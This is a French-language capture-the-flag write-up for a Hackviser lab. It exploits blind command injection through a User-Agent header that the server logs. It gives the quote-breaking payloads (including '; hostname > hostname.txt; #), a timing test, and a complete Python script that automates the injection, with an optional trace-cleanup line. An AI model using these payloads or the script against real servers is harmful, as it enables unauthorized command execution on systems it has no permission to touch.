
# Writeup: Command Injection via User-Agent Log Entries (Hackviser)

## 📌 Objectif

Récupérer le hostname du serveur en exploitant une vulnérabilité de type **Command Injection** via le User-Agent, qui est loggé par l'application web.

URL du challenge : `https://epic-omega-sentinel.europe1.hackviser.space`

---

## 🔍 Reconnaissance

En accédant à la page d'accueil, un avertissement explicite nous met sur la voie :
> "Warning: User agent information is logged on our servers."

Cela suggère que le serveur utilise une commande shell pour écrire notre User-Agent dans un fichier de logs. Une implémentation shell courante (et vulnérable) ressemblerait à ceci :

```bash
echo 'User-Agent: $USER_AGENT' >> access.log
# OU
echo "User-Agent: $USER_AGENT" >> access.log
```

### Observations initiales

1. **Tentatives simples échouées** : Des injections comme `$(hostname)` ou `; id` n'ont rien donné. Cela indique que l'input est probablement encapsulé dans des guillemets simples (single quotes), empêchant l'interprétation des variables.
2. **Attaque temporelle (Timing Attack)** : En injectant `; sleep 5`, aucune latence n'a été observée.
3. **Succès partiel** : En supposant que l'input est dans des simple quotes (`'`), j'ai testé `'; sleep 5; #`.
   - **Payload** : `'; sleep 5; #`
   - **Résultat** : La réponse a mis ~5.5 secondes à revenir. **RCE Confirmée !**

---

## 💥 Exploitation

La vulnérabilité est "aveugle" (Blind RCE) : nous pouvons exécuter des commandes, mais nous ne voyons pas leur sortie directement dans la réponse HTTP.

Pour contourner cela, nous avons redirigé la sortie de la commande vers un fichier accessible publiquement à la racine du serveur web.

### Le Payload Gagnant

```bash
'; hostname > hostname.txt; #
```

**Explication détaillée :**

- `'` : Ferme la chaîne de caractères ouverte par le script de log du serveur (`echo '...`).
- `;` : Termine la commande `echo` précédente.
- `hostname > hostname.txt` : Exécute la commande `hostname` et sauve le résultat dans `hostname.txt` (dossier courant inscriptible par `www-data`).
- `; #` : Commence un commentaire bash pour ignorer la fin de la commande originale du serveur (qui devait être `' >> log_file`).

Une fois injecté, il suffit de visiter `https://epic-omega-sentinel.europe1.hackviser.space/hostname.txt` pour lire le flag.

---

## 💻 Code de l'Exploit (Python)

Voici le script complet utilisé pour automatiser l'injection et la récupération du flag :

```python
import requests
import time

url = "https://epic-omega-sentinel.europe1.hackviser.space"

def execute_cmd(cmd):
    # Payload formaté pour sortir des single quotes
    # Structure : '; <COMMANDE>; #
    payload = f"'; {cmd}; #"
    headers = {"User-Agent": payload}
    try:
        # On envoie la requête. Le timeout est court car on ne s'attend pas à une réponse lente.
        requests.get(url, headers=headers, timeout=5)
        print(f"[+] Commande envoyée : {cmd}")
    except Exception as e:
        print(f"[!] Erreur lors de l'envoi de la commande {cmd}: {e}")

def check_file(filename):
    target = f"{url}/{filename}"
    r = requests.get(target)
    if r.status_code == 200:
        print(f"\n[SUCCÈS] Fichier {filename} trouvé !")
        print(f"CONTENU DU FICHIER :\n{'-'*20}\n{r.text.strip()}\n{'-'*20}")
        return True
    return False

# 1. Injection de la commande pour écrire le hostname
cmd = "hostname > hostname.txt"
print(f"[*] Tentative d'injection RCE avec : {cmd}")
execute_cmd(cmd)

# Pause pour laisser le temps au serveur d'écrire le fichier
time.sleep(1) 

# 2. Vérification et lecture du fichier créé
print("[*] Vérification de l'existence du fichier...")
if not check_file("hostname.txt"):
    print("[-] Échec : Le fichier n'a pas été créé ou n'est pas accessible.")

# 3. (Optionnel) Nettoyage des traces
# execute_cmd("rm hostname.txt")
```

---

## 🏆 Résultat

Contenu du fichier `hostname.txt` :

```
arcane
```

Le nom d'hôte du serveur est **`arcane`**.
